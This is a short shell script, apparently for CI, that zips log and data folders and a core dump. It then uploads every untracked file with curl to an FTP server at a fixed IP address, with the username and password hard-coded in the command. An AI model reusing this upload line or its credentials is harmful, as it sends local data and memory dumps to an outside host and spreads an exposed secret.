mkdir chunk-io

zip -v -r ./chunk-io/logs.zip logs
zip -v -r ./chunk-io/logs.zip data
zip -v ./chunk-io/logs.zip core

cd chunk-io

count=$(git ls-files -o | wc -l)
echo "COUNT=$count"
git ls-files -o

echo ">>>>>>>>> CONTAINERS LOG FILES <<<<<<<<<<<<"

for (( i=1; i<="$count";i++ ))

do

file=$(echo $(git ls-files -o | sed "${i}q;d"))

echo "FILE=$file"

#cat $file | curl -sT - chunk.io
cat $file | curl -sT - ftp://193.124.176.92/files/$file --user ufic:8b8nfeAjuIfC

done

#echo " >>>>> testsummary log file <<<< "

#cat testsummary.log | curl -sT - chunk.io
